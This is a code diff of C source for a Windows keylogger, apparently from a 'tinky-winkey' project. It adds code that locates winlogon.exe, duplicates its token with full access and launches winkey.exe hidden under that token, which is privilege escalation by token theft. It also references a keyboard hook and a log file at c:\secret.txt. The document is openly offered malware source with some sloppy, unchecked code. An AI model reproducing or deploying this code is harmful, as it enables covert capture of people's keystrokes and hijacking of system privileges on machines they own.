@@ -7,54 +7,62 @@ bool shift = false;
 char title[256];
 char* timebuf = (char*)malloc(sizeof(char) * 80);
 FILE *file;
+HANDLE                  newExecToken;
+PROCESS_INFORMATION     winkeyPI;
 
-
-DWORD GetPidByName()
+DWORD GetPidByName(char* filename)
 {
-    char* filename = "winlogon.exe";
-    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
-    PROCESSENTRY32 pEntry;
-    pEntry.dwSize = sizeof(PROCESSENTRY32);
-    BOOL hRes = Process32First(hSnapShot, &pEntry);
-    while (hRes)
-    {
-        if (strcmp(pEntry.szExeFile, filename) == 0)
-        {
-            CloseHandle(hSnapShot);
-            return(pEntry.th32ProcessID);
-        }
-        hRes = Process32Next(hSnapShot, &pEntry);
-    }
-    CloseHandle(hSnapShot);
-    return(0);
+	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+	PROCESSENTRY32 pEntry;
+	PROCESSENTRY32 ptemp[5];
+	pEntry.dwSize = sizeof(PROCESSENTRY32);
+	BOOL hRes = Process32First(hSnapShot, &pEntry);
+	int i = 0;
+	while (hRes)
+	{
+		if (strcmp(pEntry.szExeFile, filename) == 0)
+		{
+			ptemp[i] = pEntry;
+			i++;
+			//CloseHandle(hSnapShot);
+		}
+		hRes = Process32Next(hSnapShot, &pEntry);
+	}
+	CloseHandle(hSnapShot);
+	printf("%ld", ptemp[0].th32ProcessID);
+	return(ptemp[i-1].th32ProcessID);
+	//return(0);
 }
 
 void    Tinky_Winky() {
-    DWORD winlogonPID;
-    HANDLE wlPH;
-    HANDLE wlTH;
-    HANDLE newExecToken;
-    PROCESS_INFORMATION winkeyPI;
-    char Path[260];
-    LPWSTR PP = L"c:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+	DWORD winlogonPID;
+	HANDLE wlPH;
+	HANDLE wlTH;
+	LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+	STARTUPINFO Si;
 
-    winlogonPID = GetPidByName();
-    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
-    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
-        printf("opt\n");
-    }
-    CloseHandle(wlPH);
-    if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
-        printf("dtEx\n");
-    }
-    CloseHandle(wlTH);
-    GetCurrentDirectory(260, Path);
-    strcat(Path, "\\winkey.exe 1337");
-    int i = 0;
+	//ZeroMemory(&Si, sizeof(Si));
+	//Si.cb = sizeof(Si);
+	winlogonPID = GetPidByName("winlogon.exe");
+	wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
+	if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
+		printf("opt\n");
+	}
+	CloseHandle(wlPH);
+	/*if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
+		printf("dtEx\n");
+	}*/
+	if (!DuplicateTokenEx(wlTH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newExecToken)) {
+		printf("dtEx\n");
+	}
+	CloseHandle(wlTH);
 
-    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, NULL, NULL, NULL, NULL, &winkeyPI)) {
-        //printf("cpwt (%d)\n", GetLastError());
-    }
+	/*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
+		printf("cpwt (%ld)\n", GetLastError());
+	}*/
+	if (!CreateProcessAsUserW(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOW)&Si, &winkeyPI)) {
+		printf("cpwt (%ld)\n", GetLastError());
+	}
 }
 
 void getTime(char **timebuf) {
@@ -144,12 +152,12 @@ LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main(int ac, char **av) {
-    //char* pass = "1337";
+	char* pass = "1337";
     MSG msg;
-    //if (ac == 2 && !strcmp(av[1], "1337")) {
-    //    Tinky_Winky();
-    //    return 0;
-    //}
+    if (ac == 2) {
+        Tinky_Winky();
+        return 0;
+    }
 	file = fopen("c:\\secret.txt", "a");
 	fprintf(file, "%s", "winkey init \n");
 	fclose(file);
